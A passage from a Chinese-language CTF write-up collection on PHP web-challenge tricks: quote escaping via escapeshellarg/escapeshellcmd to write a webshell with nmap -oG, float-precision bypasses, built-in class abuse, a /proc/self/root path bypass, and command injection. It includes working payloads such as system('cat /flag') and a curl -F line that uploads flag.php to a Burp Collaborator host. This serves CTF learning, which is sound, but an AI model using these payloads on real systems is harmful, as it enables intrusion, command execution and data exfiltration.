    escapeshellarg：''\'' lemon shy ''\''
    escapeshellcmd: ''\\'' lemon shy ''\\''
这样就很好理解了，那就会可以实现单引号的逃逸了，接下来就来测试payload：
    '  -oG 1.php'
    如果最后的单引号是没有空格，则文件名后面就会多出\\，所以后面要加上空格
    前面加空格不加则无影响，因为不会影响到一句话木马里面的内容
但还有一个问题，escapeshellcmd会把一句话木马中的一些字符给转义的，又该怎么办，测试一下在本地传一下发现虽然看起来转义了，但写入的话还是没有被转义的。
所以最终的payload:
    '  -oG 1.php '
    或
    ' -oG 1.php '
创建的目录也出来了，写的一句话木马文件在该目录下，连接一下，得到flag
也可以传一个GET进去，调用system函数
    '  -oG 2.php '
    http://e5b384ba-6852-4e3f-9060-c66dc267e554.node3.buuoj.cn/8f9395193b358d86a100d2fd1f0349a2/2.php?a=system('cat /flag');
## 0x11：PHP精度绕过缺陷
几次都碰到这个点，记录一下，省的以后忘了再去查
**浮点运算的坑**
在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，先来看个小例子
输出的是57，而我们预想的应该是58
具体详细的原理可以看这位师傅的描述  
简单的说因为PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为
`1.11e-16`,当小数小于`10^-16`后，PHP对于小数就大小不分了，如下图：
再来看一道ciscn2020初赛的题，便考察了这一点：
**easytrick**
     trick1 = (string)$this->trick1;
            if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){
                die("你太长了");
            }
            if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){
                echo file_get_contents("/flag");
            }
        }
    }
    highlight_file(__FILE__);
    unserialize($_GET['trick']);
看了Drom师傅的博客学到了这种方法：
因为这道题是考察 **浮点数精度问题导致的大小比较以及函数处理问题** ，当小数小于`10^-16`后，PHP对于小数就大小不分了
    var_dump(1.000000000000000 == 1) >> TRUE
    var_dump(1.0000000000000001 == 1) >> TRUE
`0.9999999999999999`（ **17个9** ）经过`strlen`函数会判断为1  
经过测试发现`!==`和`!=`均成立
最后看一下md5函数处理后是否相同
确实也成立，那就写payload即可
    trick1 = 1;
    $shy->trick2 = 0.9999999999999999;
    echo urlencode(serialize($a));
注意这里trick1的值必须为1，如果为0.9999999999999999则出不来结果，因为`$this->trick1 =
(string)$this->trick1;`有这个语句的限制，如果为0.9999999999999999，则浮点数就变成了字符类型，因此就不会产生上面的浮点数精度问题
## 0x12:PHP中类的运用
####  反射类ReflectionClass
可以看官方的例子了解一下  
这里举个例子，方便理解反射类ReflectionClass
    class fuc { //定义一个类
     static
     function ec() {
      echo '我是一个类';
     }
    }
    $class=new ReflectionClass('fuc'); //建立 fuc这个类的反射类
    $fuc=$class->newInstance(); //相当于实例化 fuc 类
    $fuc->ec(); //执行 fuc 里的方法ec
    /*最后输出:我是一个类*/
    #还有其他用法
    $ec=$class->getmethod('ec'); //获取fuc 类中的ec方法
    $fuc=$class->newInstance(); //实例化
    $ec->invoke($fuc);   //执行ec 方法
例如这道题：
payload：
    ?v1=1&v2=echo new ReflectionClass&v3=;
####  异常处理类Exception
先简单了解一下PHP异常处理
这里举个例子，方便理解异常类
    1)
        {
            throw new Exception("变量值必须小于等于 1");
        }
            return true;
    }
    // 在 try 块 触发异常
    try
    {
        checkNum(2);
        // 如果抛出异常，以下文本不会输出
        echo '如果输出该内容，说明 $number 变量';
    }
    // 捕获异常
    catch(Exception $e)
    {
        echo 'Message: ' .$e->getMessage();
    }
    ?>
    上面代码将得到类似这样一个错误：Message: 变量值必须小于等于 1
例如这道题：
    ?v1=Exception&v2=system('ls')
虽然源代码中含有了括号，但是我们还是可以自己加上去，以及在里面设置参数，后面多出的（）不对结果造成影响
####  内置类FilesystemIterator
先简单了解一下这个类的作用
> PHP使用FilesystemIterator迭代器遍历目录
例如这道题：
只需获取当前路径，便可以将当前目录下所有文件给显示出来，这里可以使用php中的getcwd这个函数
> getchwd() 函数返回当前工作目录
故payload为
    ?v1=FilesystemIterator&v2=getcwd
## 0x13：一些姿势汇总
####  /proc/self/root绕过is_file函数
payload:
    ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
    roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
    c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
    self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
    lf/root/proc/self/root/var/www/html/flag.php
在linux中/proc/self/root是指向根目录的,这里看了很多师傅的wp，都是只记录了一个payload，找到了一个大师傅对于这个方法的解释
####  gettext&get_defined_vars函数
这道题涉及到的是php中的gettext的用法，先了解一下
> php的扩展gettext实现程序的国际化
`_()是gettext()`函数的简写形式，那既然变量f1过滤数字和字母，就可以使用该符号来代替这个函数，这样便可以绕过第一个嵌套，然后再由最外面的call_user_func执行命令
    call_user_func(call_user_func('_','phpinfo'))=>call_user_func('phpinfo')
虽然该函数会报错
但是还是会继续执行，不会停止,这时候便会执行phpinfo这个命令，但这里要获取flag,就需要再了解一个函数`get_defined_vars`
已知包含了flag.php。而flag.php肯定包含已定义好的变量列表的多维数组，故payload：
    ?f1=_&f2=get_defined_vars
####  Linux tee命令
`tee`命令主要被用来向standout(标准输出流，通常是命令执行窗口）输出的同时也将内容输出到文件
    tee file1 file2 //复制文件
    ls|tee Sn0w.txt //命令输出
例如这道题：
    ?c=ls /|tee Sn0w
    在url后面请求Sn0w文件
####  Burp Collaborator Client
这道题主要考察的是命令执行的骚操作和curl -F的使用
如果传递的参数是$F本身，会不会出现变量覆盖那
    ?F=`$F `;sleep 3
    substr函数截取前六位得到的是`$F `;
    然后$F便是输出的`$F `;sleep 3，故最后执行的代码是
    ``$F `;sleep 3`
    ``是shell_exec()函数的缩写
发现curl并没有被过滤，便可以利用curl带出flag.php，curl -F 将flag文件上传到Burp的 Collaborator Client(
Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies)
payload：
    ?F=`$F `;curl -X POST -F Sn0w=@flag.php  1216a307cv2bgog6aua6lmje157vvk.burpcollaborator.net
这里要解释一下
    #其中-F 为带文件的形式发送post请求
    #Sn0w是上传文件的name值，flag.php就是上传的文件
其实原理很简单，相当于这台服务器上传文件传输到burp的Collaborator Client
####  call_user_func读取类中的函数
call_user_func函数可以调用类中的函数，这里举一个简单的例子
    class Test
    {    
        static public function getS()
        {
            echo "123";
        }
    }
    相当于
    call_user_func(array('Test','getS'));
    #输出结果
    123
    定义一个类Test及类方法getS,call_user_func的输入参数变为一个数组，数组第一个元素为对象名、第二个元素为参数
    #如果不加static，数据会出现，但是有可能会报错
例如：
payload：
    ctfshow[0]=ctfshow&ctfshow[1]=getFlag
####  create_function函数
create_function，第一个参数是参数，第二个参数是内容，函数结构类似：
    create_function('$a,$b','return 111')
    相当于如下：
    function a($a, $b){
        return 111;
    }
所以那如果我们这样进行构造payload
    create_function('$a,$b','return 111;}phpinfo();//')
    function a($a, $b){
        return 111;}phpinfo();//
    }
phpinfo()便会被执行，所以根据这个思路来进行构造payload
    ?show=echo Sn0w;}system('cat f*');//
    DATA:
    ctf=%5ccreate_function